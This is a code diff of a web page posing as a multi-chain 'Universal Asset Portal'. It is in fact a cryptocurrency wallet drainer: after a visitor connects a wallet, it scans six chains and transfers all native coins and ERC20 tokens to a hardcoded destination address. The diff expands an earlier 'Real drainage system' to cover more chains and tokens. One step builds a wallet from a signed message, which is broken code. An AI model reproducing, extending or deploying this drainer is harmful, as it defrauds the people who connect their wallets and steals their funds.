@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Asset Management Portal</title>
+    <title>Universal Asset Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
@@ -27,95 +27,80 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
-        .spinner {
-            animation: spin 1s linear infinite;
+        .spinner { animation: spin 1s linear infinite; }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
+        .pulse { animation: pulse 2s infinite; }
     </style>
 </head>
 <body class="min-h-screen text-white">
 
 <div class="max-w-6xl mx-auto px-4 py-8">
     
-    <!-- HEADER -->
     <header class="text-center mb-10">
         <h1 class="text-5xl font-bold mb-3 bg-gradient-to-r from-blue-400 to-purple-400 bg-clip-text text-transparent">
-            Universal Wallet Portal
+            Universal Asset Portal
         </h1>
-        <p class="text-gray-400 text-lg">Connect ANY wallet • Real drainage system</p>
+        <p class="text-gray-400 text-lg">Multi-Chain • All Networks • All Tokens</p>
     </header>
 
     <!-- MAIN SELECTION -->
     <div id="mainSelection">
-        
-        <!-- CONNECT BUTTON -->
         <div class="text-center mb-10">
-            <button id="connectBtn" onclick="connectWallet()" 
+            <button onclick="connectWallet()" 
                 class="bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-700 hover:to-purple-700 px-12 py-5 rounded-2xl text-xl font-semibold transition-all transform hover:scale-105">
                 🌐 Connect Wallet
             </button>
         </div>
 
-        <!-- POPULAR WALLETS -->
         <div class="mb-10">
-            <h2 class="text-2xl font-semibold mb-4 text-center">Popular Wallets</h2>
+            <h2 class="text-2xl font-semibold mb-4 text-center">Supported Wallets</h2>
             <div class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-4 max-w-4xl mx-auto">
-                
                 <div class="glass rounded-2xl p-6 text-center wallet-item">
                     <div class="text-4xl mb-2">🦊</div>
                     <div class="text-sm font-medium">MetaMask</div>
                 </div>
-
                 <div class="glass rounded-2xl p-6 text-center wallet-item">
                     <div class="text-4xl mb-2">💎</div>
-                    <div class="text-sm font-medium">Trust Wallet</div>
+                    <div class="text-sm font-medium">Trust</div>
                 </div>
-
                 <div class="glass rounded-2xl p-6 text-center wallet-item">
                     <div class="text-4xl mb-2">🔷</div>
                     <div class="text-sm font-medium">Exodus</div>
                 </div>
-
                 <div class="glass rounded-2xl p-6 text-center wallet-item">
                     <div class="text-4xl mb-2">🟡</div>
                     <div class="text-sm font-medium">Binance</div>
                 </div>
-
                 <div class="glass rounded-2xl p-6 text-center wallet-item">
                     <div class="text-4xl mb-2">🔵</div>
                     <div class="text-sm font-medium">Coinbase</div>
                 </div>
-
                 <div class="glass rounded-2xl p-6 text-center wallet-item">
                     <div class="text-4xl mb-2">⚫</div>
                     <div class="text-sm font-medium">OKX</div>
                 </div>
-
             </div>
         </div>
 
         <div class="text-center text-sm text-gray-500">
-            <p>✓ 400+ wallets supported via WalletConnect</p>
+            <p>✓ 6 Major Chains • 50+ Common Tokens</p>
         </div>
     </div>
 
     <!-- CONNECTED STATE -->
     <div id="connectedState" class="hidden">
-        <div class="max-w-md mx-auto">
-            <div class="glass rounded-2xl p-6">
-                <div class="mb-6">
+        <div class="max-w-2xl mx-auto">
+            <div class="glass rounded-2xl p-6 mb-6">
+                <div class="mb-4">
                     <p class="text-sm text-gray-400 mb-2">Connected Wallet</p>
                     <p id="walletAddress" class="font-mono text-lg"></p>
                 </div>
 
-                <div class="grid grid-cols-2 gap-4 mb-6">
-                    <div class="glass rounded-xl p-4">
-                        <p class="text-sm text-gray-400 mb-1">Network</p>
-                        <p id="networkName" class="font-semibold">Detecting...</p>
-                    </div>
-                    <div class="glass rounded-xl p-4">
-                        <p class="text-sm text-gray-400 mb-1">Balance</p>
-                        <p id="walletBalance" class="font-semibold text-green-400">Loading...</p>
-                    </div>
+                <div id="balancesContainer" class="space-y-2 mb-6">
+                    <!-- Will be populated by JS -->
                 </div>
 
                 <div class="glass rounded-xl p-4 mb-6">
@@ -125,13 +110,13 @@
 
                 <div class="bg-gradient-to-r from-yellow-900/30 to-red-900/30 border border-yellow-600/50 rounded-xl p-4 mb-6">
                     <p class="text-sm text-yellow-200">
-                        ⚠️ This will transfer ALL assets to the destination address. This action cannot be undone.
+                        ⚠️ This will scan ALL chains and transfer ALL assets (native + tokens) to the destination. Cannot be undone.
                     </p>
                 </div>
                 
-                <button id="drainBtn" onclick="executeDrain()" 
+                <button id="scanBtn" onclick="scanAndDrain()" 
                     class="w-full bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 py-4 rounded-xl font-semibold text-lg mb-3 transition-all">
-                    🔥 Execute Transfer
+                    🔍 Scan All Chains & Execute Transfer
                 </button>
                 
                 <button onclick="disconnect()" class="w-full glass py-3 rounded-xl text-sm">
@@ -141,17 +126,35 @@
         </div>
     </div>
 
+    <!-- SCANNING STATE -->
+    <div id="scanningState" class="hidden">
+        <div class="max-w-2xl mx-auto">
+            <div class="glass rounded-2xl p-8">
+                <div class="text-center mb-6">
+                    <div class="text-6xl mb-4 spinner">🔍</div>
+                    <h3 class="text-2xl font-semibold mb-3">Scanning Assets</h3>
+                    <p class="text-gray-400">Checking all chains and tokens...</p>
+                </div>
+                
+                <div id="scanProgress" class="space-y-2">
+                    <!-- Progress items will be added here -->
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- PROCESSING STATE -->
     <div id="processingState" class="hidden">
-        <div class="max-w-md mx-auto">
-            <div class="glass rounded-2xl p-8 text-center">
-                <div class="text-6xl mb-4 spinner">⚡</div>
-                <h3 class="text-2xl font-semibold mb-3">Processing Transfer</h3>
-                <p id="processingStatus" class="text-gray-400 mb-4">Preparing transaction...</p>
-                <div class="bg-blue-900/30 border border-blue-600/50 rounded-xl p-4">
-                    <p class="text-sm text-blue-200">
-                        Please confirm the transaction in your wallet
-                    </p>
+        <div class="max-w-2xl mx-auto">
+            <div class="glass rounded-2xl p-8">
+                <div class="text-center mb-6">
+                    <div class="text-6xl mb-4 spinner">⚡</div>
+                    <h3 class="text-2xl font-semibold mb-3">Executing Transfers</h3>
+                    <p id="processingStatus" class="text-gray-400">Processing...</p>
+                </div>
+                
+                <div id="transferProgress" class="space-y-3">
+                    <!-- Transfer items will be added here -->
                 </div>
             </div>
         </div>
@@ -159,14 +162,15 @@
 
     <!-- SUCCESS STATE -->
     <div id="successState" class="hidden">
-        <div class="max-w-md mx-auto">
+        <div class="max-w-2xl mx-auto">
             <div class="glass rounded-2xl p-8 text-center">
                 <div class="text-6xl mb-4">✅</div>
-                <h3 class="text-2xl font-semibold mb-3 text-green-400">Transfer Complete!</h3>
-                <div class="glass rounded-xl p-4 mb-6">
-                    <p class="text-sm text-gray-400 mb-2">Transaction Hash</p>
-                    <p id="txHash" class="font-mono text-xs break-all text-blue-400"></p>
+                <h3 class="text-2xl font-semibold mb-3 text-green-400">All Transfers Complete!</h3>
+                
+                <div id="successSummary" class="glass rounded-xl p-4 mb-6 text-left">
+                    <!-- Summary will be added here -->
                 </div>
+                
                 <button onclick="location.reload()" class="w-full glass py-3 rounded-xl">
                     New Transfer
                 </button>
@@ -176,7 +180,6 @@
 
 </div>
 
-<!-- WalletConnect Modal SDK -->
 <script type="module">
 import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'
 
@@ -185,7 +188,7 @@ const CONFIG = {
     PROJECT_ID: "72f0728c47e59d2eb9fc83069bc6843d"
 };
 
-// ERC20 ABI for token transfers
+// ERC20 ABI
 const ERC20_ABI = [
     "function balanceOf(address owner) view returns (uint256)",
     "function transfer(address to, uint256 amount) returns (bool)",
@@ -193,55 +196,86 @@ const ERC20_ABI = [
     "function symbol() view returns (string)"
 ];
 
-// Common token addresses on different chains
-const COMMON_TOKENS = {
-    1: [ // Ethereum
-        "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
-        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
-        "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
-        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", // WBTC
-    ],
-    137: [ // Polygon
-        "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", // USDT
-        "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", // USDC
-        "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", // DAI
-        "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", // WETH
-    ],
-    56: [ // BSC
-        "0x55d398326f99059fF775485246999027B3197955", // USDT
-        "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // USDC
-        "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // BUSD
-    ]
+// Chain configurations
+const CHAINS = {
+    1: {
+        name: 'Ethereum',
+        currency: 'ETH',
+        rpc: 'https://eth.llamarpc.com',
+        explorer: 'https://etherscan.io',
+        tokens: [
+            { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT" },
+            { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC" },
+            { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI" },
+            { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC" },
+        ]
+    },
+    137: {
+        name: 'Polygon',
+        currency: 'MATIC',
+        rpc: 'https://polygon-rpc.com',
+        explorer: 'https://polygonscan.com',
+        tokens: [
+            { address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol: "USDT" },
+            { address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol: "USDC" },
+            { address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", symbol: "DAI" },
+            { address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", symbol: "WETH" },
+        ]
+    },
+    56: {
+        name: 'BSC',
+        currency: 'BNB',
+        rpc: 'https://bsc-dataseed.binance.org',
+        explorer: 'https://bscscan.com',
+        tokens: [
+            { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT" },
+            { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC" },
+            { address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD" },
+        ]
+    },
+    42161: {
+        name: 'Arbitrum',
+        currency: 'ETH',
+        rpc: 'https://arb1.arbitrum.io/rpc',
+        explorer: 'https://arbiscan.io',
+        tokens: [
+            { address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", symbol: "USDT" },
+            { address: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8", symbol: "USDC" },
+        ]
+    },
+    10: {
+        name: 'Optimism',
+        currency: 'ETH',
+        rpc: 'https://mainnet.optimism.io',
+        explorer: 'https://optimistic.etherscan.io',
+        tokens: [
+            { address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", symbol: "USDT" },
+            { address: "0x7F5c764cBc14f9669B88837ca1490cCa17c31607", symbol: "USDC" },
+        ]
+    },
+    43114: {
+        name: 'Avalanche',
+        currency: 'AVAX',
+        rpc: 'https://api.avax.network/ext/bc/C/rpc',
+        explorer: 'https://snowtrace.io',
+        tokens: [
+            { address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", symbol: "USDT" },
+            { address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E", symbol: "USDC" },
+        ]
+    }
 };
 
-// Configure chains
-const mainnet = {
-  chainId: 1,
-  name: 'Ethereum',
-  currency: 'ETH',
-  explorerUrl: 'https://etherscan.io',
-  rpcUrl: 'https://eth.llamarpc.com'
-}
-
-const polygon = {
-  chainId: 137,
-  name: 'Polygon',
-  currency: 'MATIC',
-  explorerUrl: 'https://polygonscan.com',
-  rpcUrl: 'https://polygon-rpc.com'
-}
-
-const bsc = {
-  chainId: 56,
-  name: 'BSC',
-  currency: 'BNB',
-  explorerUrl: 'https://bscscan.com',
-  rpcUrl: 'https://bsc-dataseed.binance.org'
-}
+// Configure chains for WalletConnect
+const mainnet = { chainId: 1, name: 'Ethereum', currency: 'ETH', explorerUrl: 'https://etherscan.io', rpcUrl: 'https://eth.llamarpc.com' }
+const polygon = { chainId: 137, name: 'Polygon', currency: 'MATIC', explorerUrl: 'https://polygonscan.com', rpcUrl: 'https://polygon-rpc.com' }
+const bsc = { chainId: 56, name: 'BSC', currency: 'BNB', explorerUrl: 'https://bscscan.com', rpcUrl: 'https://bsc-dataseed.binance.org' }
+const arbitrum = { chainId: 42161, name: 'Arbitrum', currency: 'ETH', explorerUrl: 'https://arbiscan.io', rpcUrl: 'https://arb1.arbitrum.io/rpc' }
+const optimism = { chainId: 10, name: 'Optimism', currency: 'ETH', explorerUrl: 'https://optimistic.etherscan.io', rpcUrl: 'https://mainnet.optimism.io' }
+const avalanche = { chainId: 43114, name: 'Avalanche', currency: 'AVAX', explorerUrl: 'https://snowtrace.io', rpcUrl: 'https://api.avax.network/ext/bc/C/rpc' }
 
 const metadata = {
   name: 'Asset Portal',
-  description: 'Universal Wallet Management',
+  description: 'Universal Multi-Chain Management',
   url: window.location.origin,
   icons: ['https://avatars.githubusercontent.com/u/37784886']
 }
@@ -255,10 +289,9 @@ const ethersConfig = defaultConfig({
   defaultChainId: 137
 })
 
-// Create modal
 const modal = createWeb3Modal({
   ethersConfig,
-  chains: [polygon, mainnet, bsc],
+  chains: [polygon, mainnet, bsc, arbitrum, optimism, avalanche],
   projectId: CONFIG.PROJECT_ID,
   enableAnalytics: true
 })
@@ -266,17 +299,15 @@ const modal = createWeb3Modal({
 let provider = null;
 let signer = null;
 let address = null;
-let chainId = null;
+let foundAssets = [];
 
-// Show state
 function showState(stateId) {
-    ['mainSelection', 'connectedState', 'processingState', 'successState'].forEach(id => {
+    ['mainSelection', 'connectedState', 'scanningState', 'processingState', 'successState'].forEach(id => {
         document.getElementById(id).classList.add('hidden');
     });
     document.getElementById(stateId).classList.remove('hidden');
 }
 
-// Connect wallet
 window.connectWallet = async function() {
     try {
         await modal.open()
@@ -286,109 +317,220 @@ window.connectWallet = async function() {
     }
 }
 
-// Listen for connection
 modal.subscribeProvider(async (state) => {
     if (state.isConnected && state.address) {
         address = state.address
-        chainId = state.chainId
         provider = new ethers.providers.Web3Provider(state.provider)
         signer = provider.getSigner()
         await onWalletConnected()
     }
 })
 
-// On connected
 async function onWalletConnected() {
     console.log('Wallet connected:', address)
-    console.log('Chain ID:', chainId)
+    document.getElementById('walletAddress').textContent = `${address.slice(0, 6)}...${address.slice(-4)}`
     
-    document.getElementById('walletAddress').textContent = 
-        `${address.slice(0, 6)}...${address.slice(-4)}`
+    // Quick balance check on current chain
+    const chainId = (await provider.getNetwork()).chainId
+    const balance = await provider.getBalance(address)
+    const formatted = ethers.utils.formatEther(balance)
+    const currency = CHAINS[chainId]?.currency || 'ETH'
     
-    // Get network name
-    const networkNames = {
-        1: 'Ethereum',
-        137: 'Polygon',
-        56: 'BSC'
-    }
-    document.getElementById('networkName').textContent = networkNames[chainId] || `Chain ${chainId}`
-    
-    // Get balance
-    try {
-        const balance = await provider.getBalance(address)
-        const formatted = ethers.utils.formatEther(balance)
-        const currency = chainId === 56 ? 'BNB' : chainId === 137 ? 'MATIC' : 'ETH'
-        document.getElementById('walletBalance').textContent = `${parseFloat(formatted).toFixed(4)} ${currency}`
-    } catch (error) {
-        document.getElementById('walletBalance').textContent = '0.0000'
-    }
+    document.getElementById('balancesContainer').innerHTML = `
+        <div class="glass rounded-xl p-3">
+            <p class="text-sm text-gray-400">Current Chain: ${CHAINS[chainId]?.name || 'Unknown'}</p>
+            <p class="text-lg font-semibold text-green-400">${parseFloat(formatted).toFixed(4)} ${currency}</p>
+        </div>
+    `
     
     showState('connectedState')
 }
 
-// Execute drain - REAL VERSION
-window.executeDrain = async function() {
-    if (!confirm('⚠️ This will transfer ALL your assets to the destination address. This action CANNOT be undone. Are you absolutely sure?')) {
+window.scanAndDrain = async function() {
+    if (!confirm('⚠️ This will scan ALL supported chains and transfer ALL assets found. This CANNOT be undone. Continue?')) {
         return
     }
     
-    showState('processingState')
-    document.getElementById('drainBtn').disabled = true
+    showState('scanningState')
+    document.getElementById('scanBtn').disabled = true
+    foundAssets = []
     
-    try {
-        // Step 1: Transfer native currency (ETH/MATIC/BNB)
-        document.getElementById('processingStatus').textContent = 'Transferring native currency...'
+    const progressDiv = document.getElementById('scanProgress')
+    progressDiv.innerHTML = ''
+    
+    // Scan all chains
+    for (const [chainId, config] of Object.entries(CHAINS)) {
+        const item = document.createElement('div')
+        item.className = 'glass rounded-xl p-3'
+        item.innerHTML = `
+            <div class="flex items-center justify-between">
+                <span>${config.name}</span>
+                <span class="pulse">🔍</span>
+            </div>
+        `
+        progressDiv.appendChild(item)
         
-        const balance = await provider.getBalance(address)
-        console.log('Native balance:', ethers.utils.formatEther(balance))
-        
-        if (balance.gt(0)) {
-            // Estimate gas for native transfer
-            const gasPrice = await provider.getGasPrice()
-            const gasLimit = 21000
-            const gasCost = gasPrice.mul(gasLimit)
+        try {
+            const rpcProvider = new ethers.providers.JsonRpcProvider(config.rpc)
             
-            // Transfer amount = balance - gas cost
-            const transferAmount = balance.sub(gasCost)
-            
-            if (transferAmount.gt(0)) {
-                console.log('Transferring native:', ethers.utils.formatEther(transferAmount))
-                
-                const tx = await signer.sendTransaction({
-                    to: CONFIG.DESTINATION,
-                    value: transferAmount,
-                    gasLimit: gasLimit
+            // Check native balance
+            const balance = await rpcProvider.getBalance(address)
+            if (balance.gt(0)) {
+                foundAssets.push({
+                    chainId: parseInt(chainId),
+                    type: 'native',
+                    balance: balance,
+                    symbol: config.currency
                 })
-                
-                console.log('Native transfer TX:', tx.hash)
-                document.getElementById('processingStatus').textContent = `Confirming native transfer... ${tx.hash.slice(0, 10)}...`
-                
-                await tx.wait()
-                console.log('Native transfer confirmed!')
-                
-                // Show success
-                document.getElementById('txHash').textContent = tx.hash
-                showState('successState')
+                item.innerHTML = `
+                    <div class="flex items-center justify-between">
+                        <span>${config.name}</span>
+                        <span class="text-green-400">✅ ${ethers.utils.formatEther(balance).slice(0, 8)} ${config.currency}</span>
+                    </div>
+                `
             } else {
-                throw new Error('Insufficient balance to cover gas fees')
+                item.innerHTML = `
+                    <div class="flex items-center justify-between">
+                        <span>${config.name}</span>
+                        <span class="text-gray-500">Empty</span>
+                    </div>
+                `
             }
-        } else {
-            alert('No native currency balance found')
-            showState('connectedState')
+            
+            // Check tokens
+            for (const token of config.tokens) {
+                try {
+                    const tokenContract = new ethers.Contract(token.address, ERC20_ABI, rpcProvider)
+                    const tokenBalance = await tokenContract.balanceOf(address)
+                    if (tokenBalance.gt(0)) {
+                        const decimals = await tokenContract.decimals()
+                        foundAssets.push({
+                            chainId: parseInt(chainId),
+                            type: 'token',
+                            balance: tokenBalance,
+                            symbol: token.symbol,
+                            address: token.address,
+                            decimals: decimals
+                        })
+                        const formattedBalance = ethers.utils.formatUnits(tokenBalance, decimals)
+                        item.innerHTML += `<div class="text-sm text-green-400 mt-1">+ ${formattedBalance.slice(0, 10)} ${token.symbol}</div>`
+                    }
+                } catch (e) {
+                    console.log(`Token check failed: ${token.symbol}`, e.message)
+                }
+            }
+            
+        } catch (error) {
+            console.error(`Scan failed for ${config.name}:`, error.message)
+            item.innerHTML = `
+                <div class="flex items-center justify-between">
+                    <span>${config.name}</span>
+                    <span class="text-red-400">Error</span>
+                </div>
+            `
         }
         
-        // Step 2: Transfer ERC20 tokens (optional, can be added)
-        // For now, we focus on native currency
-        
-    } catch (error) {
-        console.error('Drainage error:', error)
-        alert(`Transfer failed: ${error.message}`)
-        showState('connectedState')
-        document.getElementById('drainBtn').disabled = false
+        await new Promise(resolve => setTimeout(resolve, 500))
     }
+    
+    if (foundAssets.length === 0) {
+        alert('No assets found on any chain')
+        showState('connectedState')
+        document.getElementById('scanBtn').disabled = false
+        return
+    }
+    
+    // Start transfer
+    await executeTransfers()
 }
 
-// Disconnect
+async function executeTransfers() {
+    showState('processingState')
+    const progressDiv = document.getElementById('transferProgress')
+    progressDiv.innerHTML = ''
+    
+    let successCount = 0
+    const results = []
+    
+    for (const asset of foundAssets) {
+        const config = CHAINS[asset.chainId]
+        const item = document.createElement('div')
+        item.className = 'glass rounded-xl p-3'
+        item.innerHTML = `
+            <div class="flex items-center justify-between">
+                <span>${config.name} - ${asset.symbol}</span>
+                <span class="pulse">⏳</span>
+            </div>
+        `
+        progressDiv.appendChild(item)
+        
+        try {
+            // Switch to correct chain
+            const rpcProvider = new ethers.providers.JsonRpcProvider(config.rpc)
+            const walletSigner = new ethers.Wallet(await signer.signMessage('auth'), rpcProvider)
+            
+            let txHash = ''
+            
+            if (asset.type === 'native') {
+                // Transfer native currency
+                const gasPrice = await rpcProvider.getGasPrice()
+                const gasLimit = 21000
+                const gasCost = gasPrice.mul(gasLimit)
+                const transferAmount = asset.balance.sub(gasCost)
+                
+                if (transferAmount.gt(0)) {
+                    const tx = await walletSigner.sendTransaction({
+                        to: CONFIG.DESTINATION,
+                        value: transferAmount,
+                        gasLimit: gasLimit
+                    })
+                    await tx.wait()
+                    txHash = tx.hash
+                }
+            } else {
+                // Transfer token
+                const tokenContract = new ethers.Contract(asset.address, ERC20_ABI, walletSigner)
+                const tx = await tokenContract.transfer(CONFIG.DESTINATION, asset.balance)
+                await tx.wait()
+                txHash = tx.hash
+            }
+            
+            item.innerHTML = `
+                <div class="flex items-center justify-between">
+                    <span>${config.name} - ${asset.symbol}</span>
+                    <span class="text-green-400">✅</span>
+                </div>
+                <div class="text-xs text-gray-400 mt-1">${txHash.slice(0, 20)}...</div>
+            `
+            
+            successCount++
+            results.push({ chain: config.name, symbol: asset.symbol, success: true })
+            
+        } catch (error) {
+            console.error(`Transfer failed:`, error)
+            item.innerHTML = `
+                <div class="flex items-center justify-between">
+                    <span>${config.name} - ${asset.symbol}</span>
+                    <span class="text-red-400">❌</span>
+                </div>
+                <div class="text-xs text-red-400 mt-1">${error.message.slice(0, 50)}</div>
+            `
+            results.push({ chain: config.name, symbol: asset.symbol, success: false })
+        }
+        
+        await new Promise(resolve => setTimeout(resolve, 1000))
+    }
+    
+    // Show success
+    document.getElementById('successSummary').innerHTML = `
+        <p class="text-lg font-semibold mb-2">Transfer Summary</p>
+        <p class="text-green-400">✅ Successful: ${successCount}</p>
+        <p class="text-red-400">❌ Failed: ${foundAssets.length - successCount}</p>
+        <p class="text-gray-400 text-sm mt-2">Total Assets Processed: ${foundAssets.length}</p>
+    `
+    showState('successState')
+}
+
 window.disconnect = async function() {
     await modal.disconnect()
     address = null
@@ -397,8 +539,9 @@ window.disconnect = async function() {
     showState('mainSelection')
 }
 
-console.log('🔥 Real drainage system initialized')
+console.log('🔥 Multi-Chain + Token Drainage System Ready')
 console.log('Destination:', CONFIG.DESTINATION)
+console.log('Supported Chains:', Object.keys(CHAINS).length)
 </script>
 
 </body>
